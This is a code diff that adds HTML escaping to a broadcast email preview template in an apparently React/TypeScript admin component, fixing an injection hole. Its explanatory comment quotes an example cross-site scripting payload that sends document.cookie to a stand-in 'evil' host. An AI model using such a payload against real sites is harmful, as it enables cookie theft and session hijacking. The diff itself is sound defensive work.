@@ -36,6 +36,23 @@ import {
 import { cn } from "@/lib/ui/utils";
 import { SaveConfirmationModal } from "@/components/shared/save-confirmation-modal";
 
+/**
+ * HTML-escape a string for safe interpolation into the broadcast email
+ * template. Without this, a moderator could compose a `title` or
+ * `content` containing `</h2><script>fetch('https://evil/?c='+document.cookie)</script>`
+ * and the resulting email would run arbitrary JS in vulnradar.dev's
+ * authenticated origin on any client that opens the preview pane or
+ * forwards the message.
+ */
+function escapeHtml(input: string): string {
+  return input
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;")
+    .replace(/'/g, "&#39;");
+}
+
 interface Broadcast {
   id: string;
   title: string;
@@ -59,6 +76,10 @@ const EMAIL_COLORS = {
 };
 
 function generatePreviewHtml(title: string, content: string): string {
+  const safeTitle = escapeHtml(title || "Subject");
+  const safeContent = escapeHtml(
+    content || "<p>Email content will appear here...</p>",
+  );
   return `<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -93,8 +114,8 @@ function generatePreviewHtml(title: string, content: string): string {
           </tr>
           <tr>
             <td style="background-color: ${EMAIL_COLORS.BG_CARD}; border: 1px solid ${EMAIL_COLORS.BORDER}; border-radius: 12px; padding: 32px 28px;">
-              <h2 style="margin: 0 0 16px 0; font-size: 20px; font-weight: 600; color: ${EMAIL_COLORS.TEXT_PRIMARY};">${title || "Subject"}</h2>
-              <div style="font-size: 14px; color: ${EMAIL_COLORS.TEXT_SECONDARY}; line-height: 1.6;">${content || "<p>Email content will appear here...</p>"}</div>
+              <h2 style="margin: 0 0 16px 0; font-size: 20px; font-weight: 600; color: ${EMAIL_COLORS.TEXT_PRIMARY};">${safeTitle}</h2>
+              <div style="font-size: 14px; color: ${EMAIL_COLORS.TEXT_SECONDARY}; line-height: 1.6;">${safeContent}</div>
             </td>
           </tr>
           <tr>
